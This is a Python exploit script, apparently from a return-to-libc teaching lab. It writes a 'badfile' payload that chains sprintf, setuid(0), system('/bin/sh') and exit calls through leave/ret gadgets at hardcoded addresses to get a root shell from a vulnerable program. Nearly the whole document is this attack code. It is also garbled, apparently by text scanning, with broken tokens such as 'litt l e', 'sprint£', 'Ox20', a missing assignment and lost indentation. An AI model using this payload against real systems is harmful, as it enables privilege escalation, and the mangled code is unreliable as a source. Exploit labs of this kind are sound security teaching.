# ! /usr/bin/python3
import sys
def tobytes (value ):
return (value) .to_bytes(4 , byteorder= ' litt l e ')
content bytearray (0xaa for i in range (300) )
sh_addr = 0xbffffdd0 # Address of " / bin/sh "
leaveret = 0x08048565 # Address of leaveret
sprintf_addr = 0xb7e516d0 # Address of sprint£ ()
setuid_addr = 0xb7eb9170 # Address of setuid ()
system_addr = 0xb7e42da0 # Address of system ()
exit_addr = 0xb7e369d0 # Address of exit ()
ebp_foo = 0xbfffe4d8 # foo () ' s frame pointer
# Calculate the address of setuid ()' s 1st argument
sprintf_argl = ebp_foo + 12 + 5*0x20 
# The addr ess of a byte that contains OxOO
sprintf_arg2 = sh_addr + len("/bin/sh")
content= bytearray (0xaa for i in range (300))
# Use leaveret t o r eturn to the fir s t spri nt£ ()
ebp_next = ebp_foo + 0x20
content += tobytes( ebp_next )
conte nt += tobytes( leaveret )
content += b'A' * (0x20 - 2*4 ) # Fill up the rest of the space

# sprintf (sprintf_argl , sprintf_arg2 )
for i in r ange (4) :
ebp_next += 0x20
content += tobytes(ebp_next )
content += tobytes (sprintf_addr )
content += tobytes(leaveret )
content += tobytes(sprintf_argl )
content += tobytes(sprintf_arg2 )
content += b'A' * (0x20 - 5*4 )
sprintf_argl += 1 # Set the address for the next byte
# setuid (O)
ebp_next += Ox20
content += tobytes(ebp_next)
content += tobytes( setuid_addr )
content += tobytes(leaveret)
content += tobytes(0xFFFFFFFF ) # This value wil l be overwritten
content += b'A' * (0x20 - 4*4 )
# system (" / b in/sh ")
ebp_next += 0x20
content += tobytes (ebp_next )
content += tobytes (system_addr )
content += tobytes (leaveret )
content += tobytes (sh_addr)
content += b'A' * (0x20 - 4*4 )
# exit()
content+= tobytes(0xFFFFFFFF) # The value is not important
content+= tobytes(exit_addr)
# Write the content to a file
with open (" badfile ", " wb " ) as f :
  f.write (content )
